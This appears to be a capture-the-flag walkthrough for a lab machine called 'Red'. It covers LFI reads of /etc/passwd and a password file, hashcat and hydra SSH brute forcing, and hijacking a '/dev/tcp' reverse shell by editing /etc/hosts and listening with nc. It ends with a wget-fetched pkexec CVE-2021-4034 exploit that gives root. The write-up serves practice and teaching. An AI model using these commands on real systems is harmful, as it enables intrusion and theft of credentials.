# Room: Red
<i>A classic battle for the ages.</i>
### Description

<blockquote>
The match has started, and Red has taken the lead on you.[space][space]
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
</blockquote>

#### What To Do:
Step 1:
###### Run a **simple nmap scan** on the targets ip to check for **common ports opened**<br>we can always scan later again, if necessary.
```
nmap <target-ip>
```
###### Output:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
###### Ah, we can assume port 80 is a http server
Step 2:
###### Put the targets-ip in your browser
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/567a2646-c5d3-405a-880d-950d6b992eff)
###### 1. The first thing to notice is that the url has changed(we were redirected)<br>2. The second thing to notice is that the url has a get parameter "?page=home.html", This could be a possible vulnerability.
##### Lets Test for Local File Inclusion(LFI)
###### lets use curl on index.php file to check
```
curl http://target-ip/index.php?page=index.php
```
###### Output:
```php
<?php

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```
###### 1. As we read the function 'sanitize_input' it removes '../' and then removes './'<br>2. We see the 'sanitize_input' being used after 'preg_match' php built-in function that searches for expressions in strings<br>3. So is going to avoid us from inputting symbols, numbers before letters.
###### However we could still do this
```
curl http://target-ip/index.php?page=file:///var/www/html/index.php
```
###### That worked but now lets do...
```
curl http://target-ip/index.php?page=file:///etc/passwd
```
###### Output:
```
.....
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```
###### Ha ha, we get users blue and red
Step 3:<br>
###### Lets try to get get files in users directories
```
curl http://target-ip/index.php?page=file:///home/blue/.bashrc
```
###### Nothing Interesting.
```
curl http://target-ip/index.php?page=file:///home/blue/.bash_history
```
###### Output:
```
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```
###### Wow, we see hashcat creating a password list from one password
```
curl http://target-ip/index.php?page=file:///home/blue/.reminder
```
###### We got what looks like a password, Nice :)<br>Output:
```
sup3r_p@s$w0rd!
```
Step 4:
###### Lets ssh into blue using that password since its in user blue's directory
```
ssh blue@target-ip
```
###### Yes! We got in... Urh not for long. The password does not work anymore :(<br>Maybe thats why hashcat created a password list from the one we found.
```
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
###### Output:
```
sup3r_p@s$w0rd!123
321!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!123
Sup3r_p@s$w0rd!123
sup3r_p@s$w0rd!1230
sup3r_p@s$w0rd!1231
sup3r_p@s$w0rd!1232
sup3r_p@s$w0rd!1233
sup3r_p@s$w0rd!1234
.....
```
###### Lets use 'hydra' on ssh
```
hydra -l blue -P passlist.txt target-ip ssh
```
###### Nice!, Now lets log in again.
Step 5:
###### These bash random texts are annoying. Anyway lets run a check whats running
```
ps -aux --forest
```
###### Output:
```
red        16215  0.0  0.1   6972  2612 ?        S    10:56   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red        16234  0.0  0.1   6972  2644 ?        S    10:57   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```
###### Interesting... Lets try to ping 'redrules.thm' to find out its ip
```
ping redrules.thm
```
###### Wow, its taking ages but look at the ipv4, its weird. Lets check the '/etc/hosts' file
```
cat /etc/hosts
```
###### Output:
```
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```
###### Wow! Just Wow.<br>Lets check if there is a server listening on 'redrules:9001'
```
grep -v "rem_address" /proc/net/tcp | awk  '{x=strtonum("0x"substr($2,index($2,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($2,i,2))}{print x":"strtonum("0x"substr($2,index($2,":")+1,4))}'
```
###### No.<br>Output:
```
127.0.0.53:53
0.0.0.0:22
10.10.24.234:22
10.10.24.234:41376
10.10.24.234:37482
```
###### Lets check for clients
```
grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
```
###### Output:
```
0.0.0.0:0
0.0.0.0:0
10.8.146.73:38764
192.168.0.1:9001
192.168.0.1:9001
```
###### Ok that makes sense, since we know there are two bash commands running by user red. Does that mean the hosts fil...
```
ls -la /etc/hosts
```
###### Output:
```
-rw-r--rw- 1 root adm 242 Jul 19 11:15 /etc/hosts
```
###### 👀, Itsss writable, but can only append. This file resets too upon some command so watch out.
Step 6:
###### Use netcat(nc/netcat) to listen for and connections on port 9001
```
nc -nvlp 9001
```
###### Then append your openvpn ip to /etc/hosts file
```
echo 'your-ip redrules.thm' >> /etc/hosts
```
###### Nice we got into reds account :)
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/bd84a204-4cef-4465-adca-e8327bf19f76)
###### Lets check whats in the home directory
```
ls -la ~
```
###### Output:
```total 36
drwxr-xr-x 4 root red  4096 Aug 17  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo
```
###### A '.git' folder 👀
```
ls -la ~/.git
```
###### Output:
```
drwxr-x--- 2 red  red   4096 Aug 14  2022 .
drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
```
###### Wowwwwww, pkexec! Lets check its version to see if we can exploit it
```
./pkexec --version
```
###### Output:
```
pkexec version 0.105
```
###### If we search on google for a exploit you will come across 'CVE-2021-4034'. Since there is no compiler we can't compile it on the target. What we do find if we research for futher is that we find a python script of the exploit. Remember we can't write files in home directory so we need to download it into /tmp directory. So on in our terminal locate the file directory and start a http server so that we could download the file from the target.
###### Before we start. First open the CVE exploit file and edit the path to the pkexec
```python3
.....
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```
###### Then proceed with server
```
python3 -m http.server 8080
```
###### On the targets pc we download the 'CVE-2021-4034.py' exploit using:
```
wget http://your-ip:8080/CVE-2021-4034.py
```
###### Run the exploit
```
python3 CVE-2021-4034.py
```
###### Check your account
```bash
whoami
```
###### Output:
```
root
```
# Congratulations you just Won the battle against Red!
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/6b3eee9e-f140-4b71-a36c-f2ddc560e3c0)


